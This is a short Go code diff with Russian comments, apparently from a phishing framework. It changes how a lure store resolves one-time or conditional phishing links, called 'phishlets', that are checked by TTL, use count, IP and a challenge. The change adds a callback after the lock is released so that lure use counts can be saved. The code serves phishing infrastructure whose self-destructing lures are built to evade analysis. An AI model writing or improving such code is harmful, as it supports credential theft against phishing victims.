@@ -13,6 +13,8 @@ type Store struct {
 	mu    sync.RWMutex
 	m     map[string]string // path -> phishletID (legacy static)
 	smart map[string]*Smart
+	// OnUse вызывается (без лока) при каждом списании использования.
+	OnUse func(path string, uses int)
 }
 
 // Smart — одноразовая/условная приманка.
@@ -94,7 +96,13 @@ type SmartResolver interface {
 // ResolveSmart — проверка TTL/uses/IP/challenge + списание использования.
 func (s *Store) ResolveSmart(path, ip string, fpOK bool) (string, bool) {
 	s.mu.Lock()
-	defer s.mu.Unlock()
+	var cb func()
+	defer func() {
+		s.mu.Unlock()
+		if cb != nil {
+			cb() // уже без лока: персист не тормозит чек
+		}
+	}()
 	// Legacy static всегда валидны (обратная совместимость).
 	if pid, ok := s.m[path]; ok {
 		return pid, true
@@ -119,8 +127,12 @@ func (s *Store) ResolveSmart(path, ip string, fpOK bool) (string, bool) {
 	}
 	sm.Uses++
 	pid := sm.PhishletID
+	uses := sm.Uses
 	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
 		delete(s.smart, path) // одноразовая сгорела
+	}
+	if s.OnUse != nil {
+		cb = func() { s.OnUse(path, uses) }
 	}
 	return pid, true
 }
